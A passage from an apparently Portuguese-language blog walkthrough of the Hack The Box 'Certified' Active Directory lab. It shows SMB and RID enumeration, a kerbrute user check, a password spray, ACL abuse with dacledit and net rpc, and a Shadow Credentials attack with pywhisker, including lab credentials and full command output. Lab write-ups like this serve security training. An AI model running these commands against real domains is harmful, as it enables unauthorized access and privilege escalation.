+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.10.11.41 -d <span style="color:#e6db74">&#34;certified.htb&#34;</span> -u <span style="color:#e6db74">&#34;judith.mader&#34;</span> -p <span style="color:#e6db74">&#34;judith09&#34;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:certified.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> certified.htb<span style="color:#ae81ff">\j</span>udith.mader:judith09
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             NETLOGON        READ            Logon server share
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             SYSVOL          READ            Logon server share</span></span></code></pre></div><p>Temos acesso de leitura nas pastas comum do SMB, e não tem nenhuma informação valiosa para a gente nessas pastas.</p>
+<p>O próximo passo que fiz foi usar da credencial válida para enumerar outros usuários com bruteforce de RID:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.10.11.41 -d <span style="color:#e6db74">&#34;certified.htb&#34;</span> -u <span style="color:#e6db74">&#34;judith.mader&#34;</span> -p <span style="color:#e6db74">&#34;judith09&#34;</span> --rid-brute
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domai
+</span></span><span style="display:flex;"><span>n:certified.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> certified.htb<span style="color:#ae81ff">\j</span>udith.mader:judith09
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             498: CERTIFIED<span style="color:#ae81ff">\E</span>nterprise Read-only Domain Controllers <span style="color:#f92672">(</span>SidType
+</span></span><span style="display:flex;"><span>Group<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             500: CERTIFIED<span style="color:#ae81ff">\A</span>dministrator <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             501: CERTIFIED<span style="color:#ae81ff">\G</span>uest <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             502: CERTIFIED<span style="color:#ae81ff">\k</span>rbtgt <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             512: CERTIFIED<span style="color:#ae81ff">\D</span>omain Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             513: CERTIFIED<span style="color:#ae81ff">\D</span>omain Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             514: CERTIFIED<span style="color:#ae81ff">\D</span>omain Guests <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             515: CERTIFIED<span style="color:#ae81ff">\D</span>omain Computers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             516: CERTIFIED<span style="color:#ae81ff">\D</span>omain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             517: CERTIFIED<span style="color:#ae81ff">\C</span>ert Publishers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             518: CERTIFIED<span style="color:#ae81ff">\S</span>chema Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             519: CERTIFIED<span style="color:#ae81ff">\E</span>nterprise Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             520: CERTIFIED<span style="color:#ae81ff">\G</span>roup Policy Creator Owners <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             521: CERTIFIED<span style="color:#ae81ff">\R</span>ead-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             522: CERTIFIED<span style="color:#ae81ff">\C</span>loneable Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             525: CERTIFIED<span style="color:#ae81ff">\P</span>rotected Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             526: CERTIFIED<span style="color:#ae81ff">\K</span>ey Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             527: CERTIFIED<span style="color:#ae81ff">\E</span>nterprise Key Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             553: CERTIFIED<span style="color:#ae81ff">\R</span>AS and IAS Servers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             571: CERTIFIED<span style="color:#ae81ff">\A</span>llowed RODC Password Replication Group <span style="color:#f92672">(</span>SidType
+</span></span><span style="display:flex;"><span>Alias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             572: CERTIFIED<span style="color:#ae81ff">\D</span>enied RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeA
+</span></span><span style="display:flex;"><span>lias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             1000: CERTIFIED<span style="color:#ae81ff">\D</span>C01$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             1101: CERTIFIED<span style="color:#ae81ff">\D</span>nsAdmins <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             1102: CERTIFIED<span style="color:#ae81ff">\D</span>nsUpdateProxy <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             1103: CERTIFIED<span style="color:#ae81ff">\j</span>udith.mader <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             1104: CERTIFIED<span style="color:#ae81ff">\M</span>anagement <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             1105: CERTIFIED<span style="color:#ae81ff">\m</span>anagement_svc <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             1106: CERTIFIED<span style="color:#ae81ff">\c</span>a_operator <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             1601: CERTIFIED<span style="color:#ae81ff">\a</span>lexander.huges <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             1602: CERTIFIED<span style="color:#ae81ff">\h</span>arry.wilson <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             1603: CERTIFIED<span style="color:#ae81ff">\g</span>regory.cameron <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span></span></span></code></pre></div><p>E com isso consigo uma boa lista de outros possíveis usuários do sistema:</p>
+<pre tabindex="0"><code>judith.mader
+Administrator
+Guest
+krbtgt
+judith.mader
+management_svc
+ca_operator
+alexander.huges
+harry.wilson
+gregory.cameron</code></pre><p>Com o kerbrute, podemos testar se os usuários são válidos no sistema:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kerbrute userenum -d certified.htb  --dc DC01.certified.htb users_cleaned.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    __             __               __
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____
+</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 12/21/24 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2024/12/21 13:34:53 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>2024/12/21 13:34:53 &gt;   DC01.certified.htb:88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2024/12/21 13:34:54 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       harry.wilson@certified.htb
+</span></span><span style="display:flex;"><span>2024/12/21 13:34:54 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Administrator@certified.htb
+</span></span><span style="display:flex;"><span>2024/12/21 13:34:54 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       gregory.cameron@certified.htb
+</span></span><span style="display:flex;"><span>2024/12/21 13:34:54 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       management_svc@certified.htb
+</span></span><span style="display:flex;"><span>2024/12/21 13:34:54 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       alexander.huges@certified.htb
+</span></span><span style="display:flex;"><span>2024/12/21 13:34:54 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       judith.mader@certified.htb
+</span></span><span style="display:flex;"><span>2024/12/21 13:34:54 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       ca_operator@certified.htb
+</span></span><span style="display:flex;"><span>2024/12/21 13:34:54 &gt;  Done! Tested <span style="color:#ae81ff">9</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">7</span> valid<span style="color:#f92672">)</span> in 0.525 seconds</span></span></code></pre></div><p>Com os usuários válidos, tento ver qual deles eu consigo acessar as pastas via SMB, tentando autenticar sem passar senha, mas nenhum funcionou.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.10.11.41 -d <span style="color:#e6db74">&#34;certified.htb&#34;</span> -u docs/users_cleaned.txt -p <span style="color:#e6db74">&#34;&#34;</span> --continue-on-success
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:certified.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> certified.htb<span style="color:#ae81ff">\A</span>dministrator: STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> certified.htb<span style="color:#ae81ff">\G</span>uest: STATUS_ACCOUNT_DISABLED
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> certified.htb<span style="color:#ae81ff">\k</span>rbtgt: STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> certified.htb<span style="color:#ae81ff">\j</span>udith.mader: STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> certified.htb<span style="color:#ae81ff">\m</span>anagement_svc: STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> certified.htb<span style="color:#ae81ff">\c</span>a_operator: STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> certified.htb<span style="color:#ae81ff">\a</span>lexander.huges: STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> certified.htb<span style="color:#ae81ff">\h</span>arry.wilson: STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> certified.htb<span style="color:#ae81ff">\g</span>regory.cameron: STATUS_LOGON_FAILURE</span></span></code></pre></div><h3 id="ad-acl">AD ACL<a class="anchor" href="#ad-acl" aria-label="Link"></a></h3>
+<p>Sem muitas possibilidades com o SMB, podemos tentar enumerar como o active directory está configurado e entender melhor o nosso contexto para pensar em mais possibilidades. Decido usar o bloodhound para esse fim: <code>bloodhound-python -c All -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 -v</code> .<br>
+A melhor query eu eu consegui achar para esse grafo foi a padrão &ldquo;Find shortest paths do Domain Admin&rdquo;:</p>
+<figure><img src="/assets/image%20%2826%29.png">
+</figure>
+
+<p>Com esse grafo e as credenciais de Judith Mader, podemos começar a estudar e pensar em formas de abusar das permissões que temos para conseguir uma escalação lateral dentro do AD e conseguir conta com mais permissões. No nosso contexto, o usuário <code>management_svc</code> possui <code>CanPSRemote</code> na máquina, o que nos indicar que com esse usuário podemos finalmente interagir com comandos no servidor. <br>
+Estudando melhor a configuração representada pelo grafo do bloodhound, já se torna possível pensar em algumas possibilidades. </p>
+<p><code>Judith.Mader</code> possui permissão <code>WriteOwner</code> no grupo <code>Management</code>, que por sua vez possui permissão de <code>GenericWrite</code> em <code>management_svc</code> . Estudando melhor sobre essas permissões podemos entender que em uma visão geral, <code>Judith.Mader</code> consegue adicionar ela mesma e o <code>management_svc</code> no grupo <code>management</code>, ganhando permissão de <code>GenericWrite</code> sobre ele, o que permite ataques de <code>Shadow Credentials</code> em cima dele.</p>
+<p>O primeiro passo do plano de ataque é inserir Judith.Mader no grupo Management, usando o comando <code>net rpc group addmem &quot;Management&quot; &quot;judith.mader&quot; -U &quot;certified.htb&quot;/&quot;judith.mader&quot;%&quot;judith09&quot; -S &quot;10.10.11.41&quot;</code>, porém todas as tentativas me dão como resposta erro de acesso negado. Com a permissão de <code>WriteOwner</code> podemos editar as permissões no grupo com o comando <code>impacket-dacledit -action &quot;write&quot; -rights &quot;WriteMembers&quot; -principal &quot;judith.mader&quot; -target-dn &quot;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&quot; &quot;certified.htb&quot;/&quot;judith.mader&quot;:&quot;judith09&quot;</code><br>
+Agora consigo adicionar os usuários no grupo Management:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc group addmem <span style="color:#e6db74">&#34;Management&#34;</span> <span style="color:#e6db74">&#34;judith.mader&#34;</span> -U <span style="color:#e6db74">&#34;certified.htb&#34;</span>/<span style="color:#e6db74">&#34;judith.mader&#34;</span>%<span style="color:#e6db74">&#34;judith09&#34;</span> -S <span style="color:#e6db74">&#34;DC01.certified.htb&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CERTIFIED<span style="color:#ae81ff">\j</span>udith.mader</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc group members <span style="color:#e6db74">&#34;Management&#34;</span> <span style="color:#e6db74">&#34;management_svc&#34;</span> -U <span style="color:#e6db74">&#34;certified.htb/judith.mader%judith09&#34;</span> -S <span style="color:#e6db74">&#34;DC01.certified.htb&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CERTIFIED<span style="color:#ae81ff">\m</span>anagement_svc</span></span></code></pre></div><p>Agora, o usuário Judith.Mader possui GenericWrite em management_svc, podemos aplicar um ataque Shadow Credentials para conseguir a Hash NTLM desse usuário. Para isso, uso o <code>pywhisker</code> para performar esse ataque.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> python3 pywhisker.py -d <span style="color:#e6db74">&#34;certified.htb&#34;</span> -u <span style="color:#e6db74">&#34;judith.mader&#34;</span> -p <span style="color:#e6db74">&#34;judith09&#34;</span> --target <span style="color:#e6db74">&#34;management_svc&#34;</span> --action <span style="color:#e6db74">&#34;list&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> the target account
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target user found: CN<span style="color:#f92672">=</span>management service,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>certified,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Listing devices <span style="color:#66d9ef">for</span> management_svc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DeviceID: c4568b67-d5e8-b87b-ef31-7fa806252d1d | Creation Time <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>: 2024-12-11 01:56:47.508152</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 pywhisker.py -d <span style="color:#e6db74">&#34;certified.htb&#34;</span> -u <span style="color:#e6db74">&#34;judith.mader&#34;</span> -p <span style="color:#e6db74">&#34;judith09&#34;</span> --target <span style="color:#e6db74">&#34;management_svc&#34;</span> --action <span style="color:#e6db74">&#34;info&#34;</span> --device-id c4568b67-d5e8-b87b-ef31-7fa806252d1d
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> the target account
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target user found: CN<span style="color:#f92672">=</span>management service,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>certified,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found device Id
+</span></span><span style="display:flex;"><span>&lt;KeyCredential structure at 0x7faaa64a2c30&gt;
+</span></span><span style="display:flex;"><span>  | Owner: CN<span style="color:#f92672">=</span>management service,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>certified,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>  | Version: 0x200
+</span></span><span style="display:flex;"><span>  | KeyID: Wot7a3/O7rRj1H4RmoADdyRDvSOtaN4VD92IPnUZfFk<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  | KeyHash: 2041f6072ebb7d1936c0d0a9e6e032803b555502cda83b7c8e6e9be5a25183d1
+</span></span><span style="display:flex;"><span>  | RawKeyMaterial: &lt;dsinternals.common.cryptography.RSAKeyMaterial.RSAKeyMaterial object at 0x7faaa64a2a50&gt;
+</span></span><span style="display:flex;"><span>  |  | Exponent <span style="color:#f92672">(</span>E<span style="color:#f92672">)</span>: <span style="color:#ae81ff">65537</span>
+</span></span><span style="display:flex;"><span>  |  | Modulus <span style="color:#f92672">(</span>N<span style="color:#f92672">)</span>: 0xcbfde43f160e5c77028303329f742921d823d9dd940b6bb07b704695877d84d4161abf033a59a39856e12ff66de946bccfc48a27685b5d8ca63c499135a6516ac8c8ba3eb53116f0c283531c9b253851c99b2170a2a858ce0e7e77ba1268c58a6dac0ad4e425536ad079bc3a7bf65e14476c10f40ba2e9d8a32cba73eada2892e95a2f8fc425175f8bbc2067e82a846bd2f0af5a8d1954afab8bf138ec61bf70197ae38ce10581dbd00b427f1458cfbbe330046a94582f9457a5fbc919260901c657592a81fa9bfb7598e99fa1c71c0db5d79fc6a39e6fde515919e4bda77dfaa2ef72702a2d1276b5f8f28a9cac7bba95d41e51b79f0b7d7d03ed92efd7a1f7
+</span></span><span style="display:flex;"><span>  |  | Prime1 <span style="color:#f92672">(</span>P<span style="color:#f92672">)</span>: 0x0
+</span></span><span style="display:flex;"><span>  |  | Prime2 <span style="color:#f92672">(</span>Q<span style="color:#f92672">)</span>: 0x0
+</span></span><span style="display:flex;"><span>  | Usage: KeyUsage.NGC
+</span></span><span style="display:flex;"><span>  | LegacyUsage: None
+</span></span><span style="display:flex;"><span>  | Source: KeySource.AD
+</span></span><span style="display:flex;"><span>  | DeviceId: c4568b67-d5e8-b87b-ef31-7fa806252d1d
+</span></span><span style="display:flex;"><span>  | CustomKeyInfo: &lt;CustomKeyInformation at 0x7faaa64835c0&gt;
+</span></span><span style="display:flex;"><span>  |  | Version: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  |  | Flags: KeyFlags.NONE
+</span></span><span style="display:flex;"><span>  |  | VolumeType: None
+</span></span><span style="display:flex;"><span>  |  | SupportsNotification: None
+</span></span><span style="display:flex;"><span>  |  | FekKeyVersion: None
+</span></span><span style="display:flex;"><span>  |  | Strength: None
+</span></span><span style="display:flex;"><span>  |  | Reserved: None
+</span></span><span style="display:flex;"><span>  |  | EncodedExtendedCKI: None
+</span></span><span style="display:flex;"><span>  | LastLogonTime <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>: 2024-12-11 01:56:47.508152
+</span></span><span style="display:flex;"><span>  | CreationTime <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>: 2024-12-11 01:56:47.508152</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 pywhisker.py -d <span style="color:#e6db74">&#34;certified.htb&#34;</span> -u <span style="color:#e6db74">&#34;judith.mader&#34;</span> -p <span style="color:#e6db74">&#34;judith09&#34;</span> --target <span style="color:#e6db74">&#34;management_svc&#34;</span> --action <span style="color:#e6db74">&#34;add&#34;</span> --filename out</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> python3 pywhisker.py -d <span style="color:#e6db74">&#34;certified.htb&#34;</span> -u <span style="color:#e6db74">&#34;judith.mader&#34;</span> -p <span style="color:#e6db74">&#34;judith09&#34;</span> --target <span style="color:#e6db74">&#34;management_svc&#34;</span> --action <span style="color:#e6db74">&#34;add&#34;</span> --filename out
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> the target account
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target user found: CN<span style="color:#f92672">=</span>management service,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>certified,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate generated
